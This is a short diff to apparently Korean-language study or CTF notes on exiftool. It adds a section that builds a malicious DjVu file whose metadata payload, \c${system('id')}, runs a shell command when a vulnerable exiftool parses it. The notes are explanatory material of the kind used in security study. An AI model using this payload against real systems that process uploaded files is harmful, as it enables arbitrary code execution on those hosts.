@@ -9,6 +9,13 @@ exiftool -a -u brochure.pdf
 - `-u` (*unknown*) : 표준에 없는(알 수 없는) 태그까지 표시  
 - `brochure.pdf` : 대상 파일
 
+## exiftool code execution
+```bash
+payload : (metadata "\c${system('id')};")
+bzz payload payload.bzz
+djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
+file exploit.djvu
+```
 ---
 
 # 교차 컴파일
